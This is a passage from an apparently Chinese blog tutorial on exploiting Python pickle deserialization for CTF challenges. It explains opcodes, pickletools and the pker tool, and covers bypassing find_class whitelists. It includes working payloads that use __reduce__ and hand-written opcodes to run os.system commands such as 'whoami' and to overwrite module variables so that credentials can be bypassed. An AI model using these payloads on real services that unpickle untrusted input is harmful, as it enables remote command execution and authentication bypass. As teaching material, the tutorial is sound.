href="https://xz.aliyun.com/t/7436?time__1311=n4+xnD0Dy7GQDt=G=GCDlhjecQhiWeWNHe4D#toc-11">如何手写opcode部分的内容</a></p><p><strong><code>(B)</code></strong>: <code>BUILD</code> - 用于构建一个新的 Python 对象。</p><p><strong><code>(G)</code></strong>: <code>GLOBAL</code> - 引用一个全局名称，用于处理模块级别的对象。</p><p><strong><code>(S)</code></strong>: <code>SETITEM</code> - 设置字典或其他映射对象中的条目。</p><p><strong><code>(R)</code></strong>: <code>RECURSIVE</code> - 用于处理对象的递归引用。</p><p><strong><code>(L)</code></strong>: <code>LONG</code> - 表示长整型数值（在 Python 2 中）。</p><p><strong><code>(I)</code></strong>: <code>INT</code> - 表示整数。</p><p><strong><code>(d)</code></strong>: <code>DICT</code> - 表示字典对象。</p><p><strong><code>(N)</code></strong>: <code>NONE</code> - 表示 <code>None</code> 对象</p></blockquote><p><code>pickletools.dis()</code>的输出会显示pickle数据中的操作码及其参数。由于每个操作码都有一个字节值，所以在打印结果中大概率是看到操作码的字节值以及其它参数。</p><h3 id="pickletools调试器"><a href="#pickletools调试器" class="headerlink" title="pickletools调试器"></a>pickletools调试器</h3><p>pickletools是python自带的pickle调试器，主要有三个功能：</p><p><strong>反汇编</strong>一个已经被打包的字符串：解析字符串，表明该字符串都干了些啥，反汇编结果的<strong>每一行都是一条指令</strong>。</p><p><strong>优化</strong>一个已经被打包的字符串：其实就是把不必要的<code>PUT</code>指令删除掉。</p><p><strong>返回</strong>一个迭代器来供程序使用</p><p>通常使用前两种。</p><p><strong>使用pickletools可以方便的将opcode转化为便于肉眼读取的形式</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickletools<br><br>p = pickle.dumps(obj)<br><span class="hljs-comment"># 反汇编功能</span><br>pickletools.dis(p)<br><span class="hljs-comment"># 优化功能</span><br>pickletools.optimize(p)<br></code></pre></td></tr></table></figure><h2 id="pickle-漏洞利用"><a href="#pickle-漏洞利用" class="headerlink" title="pickle-漏洞利用"></a>pickle-漏洞利用</h2><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><blockquote><ul><li>任意代码执行&#x2F;命令执行</li><li>变量覆盖，通过覆盖一些凭证达到绕过身份验证的目的</li></ul></blockquote><h3 id="pickle-EXP的简单demo"><a href="#pickle-EXP的简单demo" class="headerlink" title="pickle EXP的简单demo"></a>pickle EXP的简单demo</h3><ul><li>对应漏洞利用思路中的<code>任意代码执行/命令执行</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">genpoc</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        s = <span class="hljs-string">&quot;&quot;&quot;echo test &gt;poc.txt&quot;&quot;&quot;</span>  <span class="hljs-comment"># 要执行的命令</span><br>        <span class="hljs-keyword">return</span> (os.system, (s,))<br><br>e = genpoc()<br>poc = pickle.dumps(e)<br><span class="hljs-built_in">print</span>(poc)<br>pickle.loads(poc)  <span class="hljs-comment"># 执行反序列化loads操作时，就会触发执行命令</span><br></code></pre></td></tr></table></figure><p>题外话：三个单引号的作用，可以是将多行数据分行输出，引号中的各行数据可以任意加注释。</p><p>对于命令<code>echo test &gt;poc.txt</code>的解释：该指令的作用是将指定的文本内容输出到一个文件中。待输出的文本内容是<code>test</code>，接收的文本是<code>poc.txt</code></p><ul><li>对应漏洞利用思路中的<code>变量覆盖</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><br>key1 = <span class="hljs-string">b&#x27;321&#x27;</span><br>key2 = <span class="hljs-string">b&#x27;123&#x27;</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">exec</span>, (<span class="hljs-string">&quot;key1=b&#x27;1&#x27;\nkey2=b&#x27;2&#x27;&quot;</span>,))<br><br>a = A()<br>pickle_a = pickle.dumps(a)<br><span class="hljs-built_in">print</span>(pickle_a)<br><br>pickle.loads(pickle_a)<br><span class="hljs-built_in">print</span>(key1, key2)<br></code></pre></td></tr></table></figure><p>程序运行结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240915222454087.png" alt="image-20240915222454087"></p><p>其实就是反序列化的时候，触发了<code>object.__reduce__（）</code>中的重新赋值指令。对变量的再赋值是永久性的。（可以粗略理解为，反序列化后又多执行了<code>object.__reduce__（）</code>中的命令或代码）</p><h3 id="手写opcode"><a href="#手写opcode" class="headerlink" title="手写opcode"></a>手写opcode</h3><ul><li><p>在CTF中，很多时候需要<strong>一次执行多个函数</strong>或<strong>一次执行多个命令</strong>，此时不能光用<code>object.__reduce__（）</code>来解决问题了（因为<code>__reduce__（）</code>返回的元组中<strong>只有一个用于重建对象的函数</strong>以及<strong>包含传递给重建函数的参数的元组</strong>，所以，该方法控制序列化的过程中一次只能执行一个函数，当<strong>exec被禁用</strong>时，就不能一次执行多条指令了），而是需要手动拼接或构造opcode了。</p><p><strong>手写opcode是pickle反序列化的一个难点。</strong></p></li><li><p>常用的opcode操作码参考<a href="https://xz.aliyun.com/t/7436?time__1311=n4+xnD0Dy7GQDt=G=GCDlhjecQhiWeWNHe4D#toc-11">如何手写opcode部分的内容</a>当中的表格。更多更详细的opcode见<a href="https://github.com/python/cpython/blob/master/Lib/pickle.py#L111">pickle库的源代码</a>。</p></li></ul><p>此外：</p><blockquote><p><code>TRUE</code> 可以用 <code>I</code> 表示： <code>b&#39;I01\n&#39;</code> ； </p><p><code>FALSE</code> 也可以用 <code>I</code> 表示： <code>b&#39;I00\n&#39;</code>。</p></blockquote><ul><li>需要注意的地方❗</li></ul><blockquote><p>· 编写opcode时要想象栈中的数据，以正确使用每种opcode</p><p>· 在理解时注意与python本身的操作对照，比如python列表的<code>append</code>对应<code>a</code>，<code>extend</code>对应<code>e</code>，字典的<code>update</code>对应<code>u</code></p><p>· <code>c</code>操作符会尝试import库，所以在<code>pickle.loads</code>时不需要漏洞代码中先引入系统库</p><p>· pickle不支持列表索引、字典索引、点号取对象属性作为左值，需要索引时只能先获取相应的函数，如<code>getattr</code>、<code>dict.get</code>，才能进行。</p><p>但由于存在<code>s</code>、<code>u</code>、<code>b</code>操作符，<code>作为右值时可以的</code>。即查值不行，赋值可以。</p><p>pickle能够索引查值的操作只有<code>c</code>、<code>i</code></p><p>· <code>s</code>、<code>u</code>、<code>b</code>操作符可以构造并赋值原来没有的属性、键值对</p></blockquote><p>​<strong>如何查值也是CTF的一个重要考点</strong>。</p><h4 id="拼接opcode"><a href="#拼接opcode" class="headerlink" title="拼接opcode"></a>拼接opcode</h4><blockquote><p>将第一个pickle流结尾表示结束的<code>.</code>去掉，将第二个pickle流与第一个拼接起来即可</p></blockquote><h4 id="全局变量覆盖"><a href="#全局变量覆盖" class="headerlink" title="全局变量覆盖"></a>全局变量覆盖</h4><p>直接上python代码进行解析：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># secret.py</span><br>name = <span class="hljs-string">&#x27;TEST3213qkfsmfo&#x27;</span><br><br><span class="hljs-comment"># main.py</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> secret<br><br>opcode = <span class="hljs-string">&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">(S&#x27;name&#x27;</span><br><span class="hljs-string">S&#x27;1&#x27;</span><br><span class="hljs-string">db.&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;before:&#x27;</span>, secret.name)<br><br>output = pickle.loads(opcode.encode())<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;output:&#x27;</span>, output)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;after:&#x27;</span>, secret.name)<br></code></pre></td></tr></table></figure><p>程序的执行结果如下：</p><p>可以看到，通过构造opcode，可以实现对全局变量的修改，即覆盖。</p><p><strong>这里的全局变量指的是外部模块secret的属性成员，通过在main模块构造opcode，利用pickle的反序列化函数loads()实现对外部模块属性成员值的更改（覆盖）。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240916132552461.png" alt="image-20240916132552461"></p><p>opcode构造解析：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON">opcode = <span class="hljs-string">&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">(S&#x27;name&#x27;</span><br><span class="hljs-string">S&#x27;1&#x27;</span><br><span class="hljs-string">db.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><code>c__main__\nsecret\n</code>：c操作码表示获取一个全局对象或import一个模块，具体写法是<code>c[module]\n[instance]\n</code>，在上述构造的opcode这部分表示的是在main模块中导入secret这个模块。对应栈的情况是：获得的对象入栈。</p><p><code>(</code>：左括号表示向栈中压入一个MARK标记。</p><p><code>S&#39;name&#39;</code>以及<code>S&#39;1&#39;</code>：S操作码表示实例化一个字符串对象，具体写法是<code>S&#39;xxx&#39;\n</code>。这里实例化了两个字符串对象，分别是’name’和’1’。对应栈的情况是：获得的对象入栈。</p><p><code>d</code>：寻找栈中的上一个MARK，并组合之间（d操作码和上一个MARK之间）的数据为字典（数据必须是偶数个，呈key-value对）。对应栈的情况是：MARK标记以及被组合的数据出栈，获得的对象入栈。上述opcode对应部分的字典数据为：{‘name’: ‘1’}</p><p><code>b</code>：使用栈中的第一个元素（储存多个 属性名：属性值 的字典）对第二个元素（对象实例）进行属性设置。对应栈的情况是：栈上第一个元素出栈。上述opcode对应部分就是使用{‘name’: ‘1’}对secret进行属性设置。</p><p><code>.</code>：程序结束，栈顶的第一个元素作为pickle.loads()的返回值。</p><p>（果然不容易啊！手写opcode）</p><h4 id="函数执行"><a href="#函数执行" class="headerlink" title="函数执行"></a>函数执行</h4><p>与函数执行相关的opcode有三个：<code>R</code>、<code>i</code>、<code>o</code>，所以我们可以从三个方向进行构造：</p><ul><li><code>R</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;&#x27;&#x27;cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">(S&#x27;whoami&#x27;</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><ul><li><code>i</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;&#x27;whoami</span><br><span class="hljs-string">ios</span><br><span class="hljs-string">system</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><ul><li><code>o</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;&#x27;&#x27;(cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">S&#x27;whoami&#x27;</span><br><span class="hljs-string">o.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="实例化对象"><a href="#实例化对象" class="headerlink" title="实例化对象"></a>实例化对象</h4><p>实例化对象是一种特殊的函数执行，在此简单使用<code>R</code>构造一下，其它方式类似：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>        self.name = name<br>        self.age = age<br><br>data = <span class="hljs-string">b&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">Student</span><br><span class="hljs-string">(S&#x27;XiaoMing&#x27;</span><br><span class="hljs-string">S&quot;20&quot;</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br><br>a = pickle.loads(data)<br><span class="hljs-built_in">print</span>(a.name, a.age)<br></code></pre></td></tr></table></figure><p>获取一个全局模块Student，并将其入栈</p><p>向栈中压入一个MARK标记</p><p>实例化两个字符串对象，获得的对象入栈</p><p><code>t</code>：寻找栈中的上一个MARK，并组合之间（t 和MARK标记）的数据为元组。MARK标记及数据出栈，获得的元组入栈</p><p><code>R</code>：选择栈上的第一个对象作为函数，第二个对象作为参数（必须为元组），然后调用该函数。函数和参数出栈，函数的返回值入栈。对应上述代码，函数的返回值是一个Student的实例。</p><h3 id="pker的使用"><a href="#pker的使用" class="headerlink" title="pker的使用"></a>pker的使用</h3><ul><li>pker是由@eddieivan01编写的以仿照Python的形式产生pickle opcode的解析器，可以在<a href="https://github.com/eddieivan01/pker%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%E3%80%82%E8%A7%A3%E6%9E%90%E5%99%A8%E7%9A%84%E5%8E%9F%E7%90%86%E8%A7%81%E4%BD%9C%E8%80%85%E7%9A%84paper%EF%BC%9A[%E9%80%9A%E8%BF%87AST%E6%9D%A5%E6%9E%84%E9%80%A0Pickle">https://github.com/eddieivan01/pker下载源码。解析器的原理见作者的paper：[通过AST来构造Pickle</a> opcode](<a href="https://xz.aliyun.com/t/7012)%E3%80%82">https://xz.aliyun.com/t/7012)。</a></li><li>使用pker，我们可以更方便地<strong>编写pickle opcode</strong>，pker的使用方法将在下文中详细介绍。需要注意的是，建议在能够手写opcode的情况下使用pker进行辅助编写，不要过分依赖pker。</li></ul><p>（我勒个豆！很方便啊!）</p><h4 id="pker能做的事"><a href="#pker能做的事" class="headerlink" title="pker能做的事"></a>pker能做的事</h4><p><a href="https://xz.aliyun.com/t/7012?time__1311=n4+xnD0Dy7it0QYuq05+bWDOD9BDBlC0xWw4ID#toc-5">通过AST来构造Pickle opcode</a></p><blockquote><ul><li>变量赋值：存到memo中，保存memo下标和变量名即可</li><li>函数调用</li><li>类型字面量构造</li><li>list和dict成员修改</li><li>对象成员变量修改</li></ul><p>简单来说就是，可以使用pker进行原变量覆盖、函数执行、实例化新的对象。</p></blockquote><h4 id="使用方法和示例"><a href="#使用方法和示例" class="headerlink" title="使用方法和示例"></a>使用方法和示例</h4><ol><li>pker 中的针对 pickle 的<strong>特殊语法</strong>需要重点掌握（后文给出示例）</li><li>此外我们需要注意一点：python中的所有类、模块、包、属性等都是<strong>对象</strong>，这样便于对各操作进行理解。</li><li>pker 主要用到<code>GLOBAL</code>、<code>INST</code>、<code>OBJ</code>三种特殊的函数以及一些<strong>必要的转换方式</strong>，其他的opcode也可以手动使用：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python">以下module都可以是包含`.`的子module<br>调用函数时，注意传入的参数类型要和示例一致<br>对应的opcode会被生成，但并不与pker代码相互等价<br><br>GLOBAL<br>对应opcode：<span class="hljs-string">b&#x27;c&#x27;</span><br>获取module下的一个全局对象（没有<span class="hljs-keyword">import</span>的也可以，比如下面的os）：<br>GLOBAL(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)<br>输入：module,instance(<span class="hljs-built_in">callable</span>、module都是instance)  <br><br>INST<br>对应opcode：<span class="hljs-string">b&#x27;i&#x27;</span><br>建立并入栈一个对象（可以执行一个函数）：<br>INST(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;ls&#x27;</span>)  <br>输入：module,<span class="hljs-built_in">callable</span>,para <br><br>OBJ<br>对应opcode：<span class="hljs-string">b&#x27;o&#x27;</span><br>建立并入栈一个对象（传入的第一个参数为<span class="hljs-built_in">callable</span>，可以执行一个函数））：<br>OBJ(GLOBAL(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>), <span class="hljs-string">&#x27;ls&#x27;</span>) <br>输入：<span class="hljs-built_in">callable</span>,para<br><br>xxx(xx,...)<br>对应opcode：<span class="hljs-string">b&#x27;R&#x27;</span><br>使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用）<br><br>li[<span class="hljs-number">0</span>]=<span class="hljs-number">321</span><br>或<br>globals_dic[<span class="hljs-string">&#x27;local_var&#x27;</span>]=<span class="hljs-string">&#x27;hello&#x27;</span><br>对应opcode：<span class="hljs-string">b&#x27;s&#x27;</span><br>更新列表或字典的某项的值<br><br>xx.attr=<span class="hljs-number">123</span><br>对应opcode：<span class="hljs-string">b&#x27;b&#x27;</span><br>对xx对象进行属性设置<br><br><span class="hljs-keyword">return</span><br>对应opcode：<span class="hljs-string">b&#x27;0&#x27;</span><br>出栈（作为pickle.loads函数的返回值）：<br><span class="hljs-keyword">return</span> xxx <span class="hljs-comment"># 注意，一次只能返回一个对象或不返回对象（就算用逗号隔开，最后也只返回一个元组）</span><br></code></pre></td></tr></table></figure><p><strong>注意❗</strong></p><ol><li>由于opcode本身的功能问题，pker肯定也<strong>不支持</strong>列表索引、字典索引、点号取对象属性作为<strong>左值</strong>，需要索引时只能先获取相应的函数（如<code>getattr</code>、<code>dict.get</code>）才能进行。但是因为存在<code>s</code>、<code>u</code>、<code>b</code>操作符，<strong>作为右值是可以的</strong>。即“查值不行，赋值可以”。</li><li>pker 解析<code>S</code>（实例化一个字符串对象）时，用单引号包裹字符串。所以pker代码中的双引号会被解析为单引号。</li></ol><h5 id="①pker-全局变量覆盖"><a href="#①pker-全局变量覆盖" class="headerlink" title="①pker-全局变量覆盖"></a>①pker-全局变量覆盖</h5><ul><li>覆盖直接由执行文件引入的<code>secret</code>模块中的<code>name</code>与<code>category</code>变量：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># main.py  </span><br><span class="hljs-keyword">import</span> secret <span class="hljs-comment"># secret.py中定义有 name= category= 这两个变量</span><br><br>secret=GLOBAL(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;secret&#x27;</span>) <br><span class="hljs-comment"># python的执行文件被解析为__main__对象，secret在该对象从属下</span><br>secret.name=<span class="hljs-string">&#x27;1&#x27;</span><br>secret.category=<span class="hljs-string">&#x27;2&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>覆盖引入模块的变量：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># main.py</span><br><span class="hljs-keyword">import</span> guess_game <span class="hljs-comment"># 然后guess_game.py中定义有class game，其含有成员curr_ticket</span><br><br>game = GLOBAL(<span class="hljs-string">&#x27;guess_game&#x27;</span>, <span class="hljs-string">&#x27;game&#x27;</span>)<br>game.curr_ticket = <span class="hljs-string">&#x27;123&#x27;</span><br></code></pre></td></tr></table></figure><h5 id="②pker-函数执行"><a href="#②pker-函数执行" class="headerlink" title="②pker-函数执行"></a>②pker-函数执行</h5><ul><li>通过<code>b&#39;R&#39;</code>调用：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">s=<span class="hljs-string">&#x27;whoami&#x27;</span><br>system = GLOBAL(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)<br>system(s) <span class="hljs-comment"># `b&#x27;R&#x27;`调用</span><br><span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure><ul><li>通过<code>b&#39;i&#39;</code>调用：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">INST(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><ul><li>通过<code>b&#39;c&#39;</code>与<code>b&#39;o&#39;</code>调用：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">OBJ(GLOBAL(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>), <span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><ul><li>多参数调用函数</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">INST(<span class="hljs-string">&#x27;[module]&#x27;</span>, <span class="hljs-string">&#x27;[callable]&#x27;</span>[, par0,par1...])<br>OBJ(GLOBAL(<span class="hljs-string">&#x27;[module]&#x27;</span>, <span class="hljs-string">&#x27;[callable]&#x27;</span>)[, par0,par1...])<br></code></pre></td></tr></table></figure><h5 id="③pker-实例化对象"><a href="#③pker-实例化对象" class="headerlink" title="③pker-实例化对象"></a>③pker-实例化对象</h5><ul><li>实例化对象是一种特殊的函数执行</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">animal = INST(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-keyword">return</span> animal<br><br><span class="hljs-comment"># 或者</span><br><br>animal = OBJ(GLOBAL(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>), <span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-keyword">return</span> animal<br></code></pre></td></tr></table></figure><ul><li>其中，python原文件中包含：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>:<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, category</span>):<br>        self.name = name<br>        self.category = category<br></code></pre></td></tr></table></figure><ul><li>也可以先实例化再赋值：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">animal = INST(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>)<br>animal.name=<span class="hljs-string">&#x27;1&#x27;</span><br>animal.category=<span class="hljs-string">&#x27;2&#x27;</span><br><span class="hljs-keyword">return</span> animal<br></code></pre></td></tr></table></figure><h4 id="手动辅助"><a href="#手动辅助" class="headerlink" title="手动辅助"></a>手动辅助</h4><ul><li>拼接opcode：将第一个pickle流结尾表示结束的<code>.</code>去掉，两者拼接起来即可。</li><li>建立普通的类时，可以先pickle.dumps，再拼接至payload。</li></ul><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p><strong>pickle序列化的结果与操作系统有关</strong>，使用windows构建的payload可能不能在linux上运行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># linux下(注意posix):</span><br><span class="hljs-string">b&#x27;cposix\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.&#x27;</span><br><br><span class="hljs-comment"># windows下(注意nt):</span><br><span class="hljs-string">b&#x27;cnt\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="pickle-CTF"><a href="#pickle-CTF" class="headerlink" title="pickle-CTF"></a>pickle-CTF</h2><h3 id="pickle-Unpickler-find-class"><a href="#pickle-Unpickler-find-class" class="headerlink" title="pickle.Unpickler.find_class()"></a><code>pickle.Unpickler.find_class()</code></h3><p>官方针对pickle的安全问题的建议是修改<code>find_class()</code>，引入<strong>白名单</strong>的方式来解决，很多CTF题都是针对该函数进行，所以搞清楚如何绕过该函数很重要。</p><h4 id="什么时候会调用find-class"><a href="#什么时候会调用find-class" class="headerlink" title="什么时候会调用find_class()"></a>什么时候会调用find_class()</h4><blockquote><ul><li>从opcode的角度来看，当出现<code>c</code>、<code>i</code>、<code>b&#39;\x93&#39;</code>时会调用，所以只要在这三个opcode直接引入模块时没有违反规则即可。</li><li>从python代码的角度看，<code>find_class()</code><strong>只会在解析opcode时调用一次</strong>，所以只要绕过opcode执行过程，<code>find_class()</code>就不会再调用，也就是说<code>find_class()</code>只需绕过一次，通过之后再产生的函数在黑名单中也不会拦截，所以可以通过<code>__import__</code>绕过一些黑名单。</li></ul></blockquote><p>查看例子：</p><ul><li>官方文档中的例子 —— 使用了白名单限制了能够调用的模块</li></ul><p>只有在特定模块中的特定类，才能被返回，否则提示报错。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">safe_builtins = &#123;<span class="hljs-string">&#x27;range&#x27;</span>,<span class="hljs-string">&#x27;complex&#x27;</span>,<span class="hljs-string">&#x27;set&#x27;</span>,<span class="hljs-string">&#x27;frozenset&#x27;</span>,<span class="hljs-string">&#x27;slice&#x27;</span>,&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-comment"># Only allow safe classes from builtins.</span><br>        <span class="hljs-keyword">if</span> module == <span 